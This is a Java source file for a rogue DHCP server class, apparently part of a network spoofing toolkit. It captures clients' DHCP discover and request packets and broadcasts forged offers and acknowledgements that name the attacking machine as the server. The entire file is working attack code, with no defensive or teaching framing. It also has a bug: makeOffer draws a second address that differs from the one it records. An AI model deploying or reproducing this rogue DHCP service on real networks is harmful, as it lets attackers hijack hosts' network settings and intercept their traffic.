package org.bitducks.spoofing.services;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Collections;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.NetworkInterfaceAddress;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.UDPPacket;

import org.bitducks.spoofing.core.Policy;
import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.core.rules.DHCPRule;
import org.bitducks.spoofing.packet.PacketFactory;
import org.bitducks.spoofing.scan.IpRange;
import org.bitducks.spoofing.scan.IpRangeIterator;
import org.bitducks.spoofing.util.Constants;
import org.bitducks.spoofing.util.IpUtil;
import org.dhcp4java.DHCPConstants;
import org.dhcp4java.DHCPPacket;
import org.dhcp4java.DHCPResponseFactory;

public class RogueDHCPService extends Service {

	/**
	 * The available IP address
	 */
	private Iterator<InetAddress> range;
	
	/**
	 * The network interface
	 */
	private NetworkInterface device;
	
	/**
	 * The address of the server
	 */
	private InetAddress server;
	
	/**
	 * The address of the clients who has disconnected
	 */
	private List<InetAddress> freeAddress = Collections.synchronizedList(new LinkedList<InetAddress>());
	
	/**
	 * The given adresses
	 */
	private List<InetAddress> givenAdresses = Collections.synchronizedList(new LinkedList<InetAddress>());

	public RogueDHCPService() {
		Policy policy = this.getPolicy();
		policy.addRule(new DHCPRule());
		
		this.device = Server.getInstance().getNetworkInterface();
		
		NetworkInterfaceAddress deviceAddress = this.device.addresses[0];
		
		this.server = deviceAddress.address;
		this.range = new IpRange(
				IpUtil.network(deviceAddress), 
				IpUtil.lastIpInNetwork(deviceAddress))
		.iterator();
		this.range.next();
	}

	@Override
	public void run() {
		while(!this.isCloseRequested()) {
			Packet p = this.getNextPacket();
			System.out.println(p);
			if(p != null) {
				try {
					DHCPPacket dhcp = DHCPPacket.getPacket(p.data, 0, p.data.length, false);
					byte option = dhcp.getDHCPMessageType();
					
					switch(option) {
					case DHCPConstants.DHCPDISCOVER:
						System.out.println("Discover");
						this.makeOffer(dhcp);
						break;
					case DHCPConstants.DHCPREQUEST:
						System.out.println("Request");
						this.makeAck(dhcp);
						break;
					}
				} catch(Exception e) /* We catch all exception if the packet is bad */{ e.printStackTrace(); }
			}
		}
	}

	public void makeOffer(DHCPPacket dhcp) throws UnknownHostException {
		InetAddress offer = this.getAddressOffer();
		this.givenAdresses.add(offer);
		DHCPPacket dhcpOffer = DHCPResponseFactory.makeDHCPOffer(dhcp, this.getAddressOffer(), 0xffffffff, this.server, "", null);
		
		this.sendDHCPPacket(dhcpOffer);
	}
	
	public void makeAck(DHCPPacket dhcp) throws UnknownHostException {
		InetAddress ip = dhcp.getOptionAsInetAddr((byte) 50);
		DHCPPacket dhcpAck = DHCPResponseFactory.makeDHCPAck(dhcp, ip, 0xffffffff, this.server, "", null);
		
		this.sendDHCPPacket(dhcpAck);
	}
	
	private void sendDHCPPacket(DHCPPacket dhcp) throws UnknownHostException {
		EthernetPacket ether = new EthernetPacket();
		ether.frametype = EthernetPacket.ETHERTYPE_IP;
		ether.src_mac = this.device.mac_address;
		ether.dst_mac = Constants.BROADCAST;
		
		UDPPacket udp = new UDPPacket(67, 68);
		udp.datalink = ether;
		udp.setIPv4Parameter(0, 
				false, 
				false, 
				false, 
				0, 
				false, 
				false, 
				false, 
				0, 
				0, 						// Identifier
				64, 					// TTL
				IPPacket.IPPROTO_UDP,  	// Protocol
				this.server,
				InetAddress.getByAddress(new byte[] {(byte) 255, (byte) 255, (byte) 255, (byte) 255}));
		udp.data = dhcp.serialize();
		Server.getInstance().sendPacket(udp);
	}

	public InetAddress getAddressOffer() {
		if(!freeAddress.isEmpty()) {
			return this.freeAddress.remove(0);
		} else {
			return this.range.next();
		}
	}
	
	public void addFreeAddress(InetAddress address) {
		this.freeAddress.add(address);
	}
}
